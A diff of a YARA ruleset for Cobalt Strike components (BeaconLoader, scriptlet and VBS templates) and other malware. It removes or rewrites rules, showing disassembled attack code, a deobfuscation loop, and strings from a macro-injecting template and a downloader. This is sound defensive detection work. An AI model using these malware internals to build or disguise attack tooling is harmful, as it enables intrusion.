-		FF 15 [4]          call    ds:GetLastError
-		83 ?? 7A           cmp     eax, 7Ah ; 'z'
-		75 ??              jnz     short loc_10001100
-		FF [2]             push    [ebp+ReturnLength]; uBytes
-		5?                 push    edi; uFlags
-		FF 15 [4]          call    ds:LocalAlloc
-		8B ??              mov     esi, eax
-		8D [2]             lea     eax, [ebp+ReturnLength]
-		5?                 push    eax; ReturnLength
-		FF [2]             push    [ebp+ReturnLength]; TokenInformationLength
-		5?                 push    esi; TokenInformation
-		6A 19              push    19h; TokenInformationClass
-		5?                 push    ebx; TokenHandle
-		FF 15 [4]          call    ds:GetTokenInformation
-		85 C0              test    eax, eax
-		74 ??              jz      short loc_10001103
-		FF ??              push    dword ptr [esi]; pSid
-		FF 15 [4]          call    ds:GetSidSubAuthorityCount
-		8A ??              mov     al, [eax]
-		FE C8              dec     al
-		0F B6 C0           movzx   eax, al
-		5?                 push    eax; nSubAuthority
-		FF ??              push    dword ptr [esi]; pSid
-		FF 15 [4]          call    ds:GetSidSubAuthority
-		B? 01 00 00 00     mov     ecx, 1
-		5?                 push    esi; hMem
-		81 ?? 00 30 00 00  cmp     dword ptr [eax], 3000h
-	*/
-
-	$isHighIntegrityProcess = {
-			5? 
-			5? 
-			5? 
-			8B ?? 
-			6A 19
-			5? 
-			FF 15 [4]
-			85 C0
-			75 ?? 
-			FF 15 [4]
-			83 ?? 7A 
-			75 ?? 
-			FF [2]
-			5? 
-			FF 15 [4]
-			8B ?? 
-			8D [2]
-			5? 
-			FF [2]
-			5? 
-			6A 19
-			5? 
-			FF 15 [4]
-			85 C0
-			74 ?? 
-			FF ?? 
-			FF 15 [4]
-			8A ?? 
-			FE C8
-			0F B6 C0
-			5? 
-			FF ?? 
-			FF 15 [4]
-			B? 01 00 00 00 
-			5? 
-			81 ?? 00 30 00 00 
-		}
-
-	/*
-		6A 3C               push    3Ch ; '<'; Size
-		8D ?? C4            lea     eax, [ebp+pExecInfo]
-		8B ??               mov     edi, edx
-		6A 00               push    0; Val
-		5?                  push    eax; void *
-		8B ??               mov     esi, ecx
-		E8 [4]              call    _memset
-		83 C4 0C            add     esp, 0Ch
-		C7 [2] 3C 00 00 00  mov     [ebp+pExecInfo.cbSize], 3Ch ; '<'
-		8D [2]              lea     eax, [ebp+pExecInfo]
-		C7 [2] 40 00 00 00  mov     [ebp+pExecInfo.fMask], 40h ; '@'
-		C7 [6]              mov     [ebp+pExecInfo.lpFile], offset aTaskmgrExe; "taskmgr.exe"
-		C7 [2] 00 00 00 00  mov     [ebp+pExecInfo.lpParameters], 0
-		5?                  push    eax; pExecInfo
-		C7 [2] 00 00 00 00  mov     [ebp+pExecInfo.lpDirectory], 0
-		C7 [6]              mov     [ebp+pExecInfo.lpVerb], offset aRunas; "runas"
-		C7 [2] 00 00 00 00  mov     [ebp+pExecInfo.nShow], 0
-		FF 15 [4]           call    ds:ShellExecuteExW
-		FF 75 FC            push    [ebp+pExecInfo.hProcess]; Process
-	*/
-
-	$executeTaskmgr = {
-			6A 3C
-			8D ?? C4 
-			8B ?? 
-			6A 00
-			5? 
-			8B ?? 
-			E8 [4]
-			83 C4 0C
-			C7 [2] 3C 00 00 00 
-			8D [2]
-			C7 [2] 40 00 00 00 
-			C7 [6]
-			C7 [2] 00 00 00 00 
-			5? 
-			C7 [2] 00 00 00 00 
-			C7 [6]
-			C7 [2] 00 00 00 00 
-			FF 15 [4]
-			FF 75 FC
-		}
-		
-	condition:
-		all of them
-}
-
-rule CobaltStrike_Resources_Template_Sct_v3_3_to_v4_x
-{
-	meta:
-		description = "Cobalt Strike's resources/template.sct signature for versions v3.3 to v4.x"
-		hash =  "fc66cb120e7bc9209882620f5df7fdf45394c44ca71701a8662210cf3a40e142"
-		author = "gssincla@google.com"
-		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
-		date = "2022-11-18"
-
-		id = "9d2b1dfa-5f76-503f-9198-6ed0d039e0cb"
-	strings:
-    $scriptletstart = "<scriptlet>" nocase
-    $registration = "<registration progid=" nocase
-    $classid = "classid=" nocase
-		$scriptlang = "<script language=\"vbscript\">" nocase
-		$cdata = "<![CDATA["
-    $scriptend = "</script>" nocase
-	  $antiregistration = "</registration>" nocase
-    $scriptletend = "</scriptlet>"
-
-  condition:
-    all of them and @scriptletstart[1] < @registration[1] and @registration[1] < @classid[1] and @classid[1] < @scriptlang[1] and @scriptlang[1] < @cdata[1]
-}
-
-rule CobaltStrike_Resources__Template_Vbs_v3_3_to_v4_x
-{
-	meta:
-		description = "Cobalt Strike's resources/btemplate.vbs signature for versions v3.3 to v4.x"
-		hash =  "e0683f953062e63b2aabad7bc6d76a78748504b114329ef8e2ece808b3294135"
-		author = "gssincla@google.com"
-		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
-		date = "2022-11-18"
-		
-		id = "62f35d02-1e4e-5651-b575-888ce06b8bdd"
-	strings:
-	  $ea = "Excel.Application" nocase
-    $vis = "Visible = False" nocase
-    $wsc = "Wscript.Shell" nocase
-    $regkey1 = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" nocase
-    $regkey2 = "\\Excel\\Security\\AccessVBOM" nocase
-    $regwrite = ".RegWrite" nocase
-    $dw = "REG_DWORD"
-    $code = ".CodeModule.AddFromString"
-	 /* Hex encoded Auto_*/ /*Open */
-    $ao = { 41 75 74 6f 5f 4f 70 65 6e }
-    $da = ".DisplayAlerts"
-
-  condition:
-    all of them
 }
 
 rule CobaltStrike_Sleeve_BeaconLoader_VA_x86_o_v4_3_v4_4_v4_5_and_v4_6
@@ -35805,84 +30830,101 @@ rule CobaltStrike_Sleeve_BeaconLoader_VA_x86_o_v4_3_v4_4_v4_5_and_v4_6
     all of them
 }
 
-rule CobaltStrike_Sleeve_BeaconLoader_x86_o_v4_3_v4_4_v4_5_and_v4_6
+rule CobaltStrike_Sleeve_BeaconLoader_x64_o_v4_3_v4_4_v4_5_and_v4_6
 {
   meta:
-    description = "Cobalt Strike's sleeve/BeaconLoader.x86.o Versions 4.3 through at least 4.6"
-    hash =  "94d1b993a9d5786e0a9b44ea1c0dc27e225c9eb7960154881715c47f9af78cc1"
+    description = "Cobalt Strike's sleeve/BeaconLoader.x64.o (Base) Versions 4.3 through at least 4.6"
+    hash =  "ac090a0707aa5ccd2c645b523bd23a25999990cf6895fce3bfa3b025e3e8a1c9"
 		author = "gssincla@google.com"
 		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
 		date = "2022-11-18"
     
-    id = "32a47966-f3bb-52c3-a977-82a1b09ddf2c"
+    id = "07f751e4-f001-5b95-b229-31fbaa867cea"
   strings:
     /*
-      C6 45 B0 56 mov     [ebp+var_50], 56h ; 'V'
-      C6 45 B1 69 mov     [ebp+var_50+1], 69h ; 'i'
-      C6 45 B2 72 mov     [ebp+var_50+2], 72h ; 'r'
-      C6 45 B3 74 mov     [ebp+var_50+3], 74h ; 't'
-      C6 45 B4 75 mov     [ebp+var_50+4], 75h ; 'u'
-      C6 45 B5 61 mov     [ebp+var_50+5], 61h ; 'a'
-      C6 45 B6 6C mov     [ebp+var_50+6], 6Ch ; 'l'
-      C6 45 B7 41 mov     [ebp+var_50+7], 41h ; 'A'
-      C6 45 B8 6C mov     [ebp+var_50+8], 6Ch ; 'l'
-      C6 45 B9 6C mov     [ebp+var_50+9], 6Ch ; 'l'
-      C6 45 BA 6F mov     [ebp+var_50+0Ah], 6Fh ; 'o'
-      C6 45 BB 63 mov     [ebp+var_50+0Bh], 63h ; 'c'
-      C6 45 BC 00 mov     [ebp+var_50+0Ch], 0
+      33 C0                      xor     eax, eax
+      83 F8 01                   cmp     eax, 1
+      74 63                      jz      short loc_378
+      48 8B 44 24 20             mov     rax, [rsp+38h+var_18]
+      0F B7 00                   movzx   eax, word ptr [rax]
+      3D 4D 5A 00 00             cmp     eax, 5A4Dh
+      75 45                      jnz     short loc_369
+      48 8B 44 24 20             mov     rax, [rsp+38h+var_18]
+      48 63 40 3C                movsxd  rax, dword ptr [rax+3Ch]
+      48 89 44 24 28             mov     [rsp+38h+var_10], rax
+      48 83 7C 24 28 40          cmp     [rsp+38h+var_10], 40h ; '@'
+      72 2F                      jb      short loc_369
+      48 81 7C 24 28 00 04 00 00 cmp     [rsp+38h+var_10], 400h
+      73 24                      jnb     short loc_369
+      48 8B 44 24 20             mov     rax, [rsp+38h+var_18]
+      48 8B 4C 24 28             mov     rcx, [rsp+38h+var_10]
+      48 03 C8                   add     rcx, rax
+      48 8B C1                   mov     rax, rcx
+      48 89 44 24 28             mov     [rsp+38h+var_10], rax
+      48 8B 44 24 28             mov     rax, [rsp+38h+var_10]
+      81 38 50 45 00 00          cmp     dword ptr [rax], 4550h
+      75 02                      jnz     short loc_369
     */
 
     $core_sig = {
-      C6 45 B0 56
-      C6 45 B1 69
-      C6 45 B2 72
-      C6 45 B3 74
-      C6 45 B4 75
-      C6 45 B5 61
-      C6 45 B6 6C
-      C6 45 B7 41
-      C6 45 B8 6C
-      C6 45 B9 6C
-      C6 45 BA 6F
-      C6 45 BB 63
-      C6 45 BC 00
+      33 C0
+      83 F8 01
+      74 63
+      48 8B 44 24 20
+      0F B7 00
+      3D 4D 5A 00 00
+      75 45
+      48 8B 44 24 20
+      48 63 40 3C
+      48 89 44 24 28
+      48 83 7C 24 28 40
+      72 2F
+      48 81 7C 24 28 00 04 00 00
+      73 24
+      48 8B 44 24 20
+      48 8B 4C 24 28
+      48 03 C8
+      48 8B C1
+      48 89 44 24 28
+      48 8B 44 24 28
+      81 38 50 45 00 00
+      75 02
     }
 
     /*
-      8B 4D FC    mov     ecx, [ebp+var_4]
-      83 C1 01    add     ecx, 1
-      89 4D FC    mov     [ebp+var_4], ecx
-      8B 55 FC    mov     edx, [ebp+var_4]
-      3B 55 0C    cmp     edx, [ebp+arg_4]
-      73 19       jnb     short loc_231
-      0F B6 45 10 movzx   eax, [ebp+arg_8]
-      8B 4D 08    mov     ecx, [ebp+arg_0]
-      03 4D FC    add     ecx, [ebp+var_4]
-      0F BE 11    movsx   edx, byte ptr [ecx]
-      33 D0       xor     edx, eax
-      8B 45 08    mov     eax, [ebp+arg_0]
-      03 45 FC    add     eax, [ebp+var_4]
-      88 10       mov     [eax], dl
-      EB D6       jmp     short loc_207
+      8B 04 24       mov     eax, [rsp+18h+var_18]
+      FF C0          inc     eax
+      89 04 24       mov     [rsp+18h+var_18], eax
+      8B 44 24 28    mov     eax, [rsp+18h+arg_8]
+      39 04 24       cmp     [rsp+18h+var_18], eax
+      73 20          jnb     short loc_2E7
+      8B 04 24       mov     eax, [rsp+18h+var_18]
+      0F B6 4C 24 30 movzx   ecx, [rsp+18h+arg_10]
+      48 8B 54 24 20 mov     rdx, [rsp+18h+arg_0]
+      0F BE 04 02    movsx   eax, byte ptr [rdx+rax]
+      33 C1          xor     eax, ecx
+      8B 0C 24       mov     ecx, [rsp+18h+var_18]
+      48 8B 54 24 20 mov     rdx, [rsp+18h+arg_0]
+      88 04 0A       mov     [rdx+rcx], al
     */
 
     $deobfuscator = {
-      8B 4D FC
-      83 C1 01
-      89 4D FC
-      8B 55 FC
-      3B 55 0C
-      73 19
-      0F B6 45 10
-      8B 4D 08
-      03 4D FC
-      0F BE 11
-      33 D0
-      8B 45 08
-      03 45 FC
-      88 10
-      EB D6
+      8B 04 24
+      FF C0
+      89 04 24
+      8B 44 24 28
+      39 04 24
+      73 20
+      8B 04 24
+      0F B6 4C 24 30
+      48 8B 54 24 20
+      0F BE 04 02
+      33 C1
+      8B 0C 24
+      48 8B 54 24 20
+      88 04 0A
     }
+
     
   condition:
     $core_sig and not $deobfuscator
@@ -36160,29 +31202,6 @@ rule APT_DNSpionage_Karkoff_Malware_Apr19_1 {
          1 of ($x*) or
          all of ($s*)
       )
-}
-
-rule HKTL_NativeCmd_subTee_Jul15 {
-   meta:
-      description = "NativeCmd - used by various threat groups"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
-      date = "2015-07-10"
-      modified = "2023-01-06"
-      old_rule_name = "subTee_nativecmd"
-      score = 40
-      hash = "758e6b519f6c0931ff93542b767524fc1eab589feb5cfc3854c77842f9785c92"
-   strings:
-      $x2 = "RunFile: couldn't find ShellExecuteExA/W in SHELL32.DLL!" fullword ascii 
-      $x3 = "Error executing CreateProcess()!!" fullword wide 
-      $x4 = "cmdcmdline" fullword wide
-      $x5 = "Invalid input handle!!!" fullword ascii
-      $s5 = "Usage: destination [reference]" fullword wide
-      $s6 = ".com;.exe;.bat;.cmd" wide
-      $s15 = "%-8s %-3s  %*s %s  %s" fullword wide
-      $s16 = " %%%c in (%s) do " fullword wide
-   condition:
-      uint16(0) == 0x5a4d and ( 2 of ($x*) or 6 of ($s*) )
 }
 
 rule APT_MAL_WildNeutron_javacpl {
@@ -36565,30 +31584,6 @@ rule MAL_Sednit_DelphiDownloader_Apr18_2 {
       $fp1 = "<key name=\"profiles\">"
    condition:
       filesize < 4000KB and 1 of ($s*) and not 1 of ($fp*)
-}
-
-rule MAL_Sednit_DelphiDownloader_Apr18_3 {
-   meta:
-      description = "Detects malware from Sednit Delphi Downloader report"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/"
-      date = "2018-04-24"
-      modified = "2023-01-06"
-      hash1 = "ecb835d03060db1ea3496ceca2d79d7c4c6c671c9907e0b0e73bf8d3371fa931"
-      hash2 = "e355a327479dcc4e71a38f70450af02411125c5f101ba262e8df99f9f0fef7b6"
-      id = "2200fbdc-3600-51d4-a273-dc7fd4127c05"
-   strings:
-      $ = "Processor Level: " fullword ascii
-      $ = "CONNECTION ERROR" fullword ascii
-      $ = "FILE_EXECUTE_AND_KILL_MYSELF" ascii
-      $ = "-KILL_PROCESS-" ascii
-      $ = "-FILE_EXECUTE-" ascii
-      $ = "-DOWNLOAD_ERROR-" ascii
-      $ = "CMD_EXECUTE" fullword ascii
-      $ = "\\Interface\\Office\\{31E12FE8-937F-1E32-871D-B1C9AOEF4D4}\\" ascii
-      $ = "Mozilla/3.0 (compatible; Indy Library)" fullword ascii
-   condition:
-      uint16(0) == 0x5a4d and filesize < 2000KB and 3 of them
 }
 
 rule Explosion_Sample_1 {
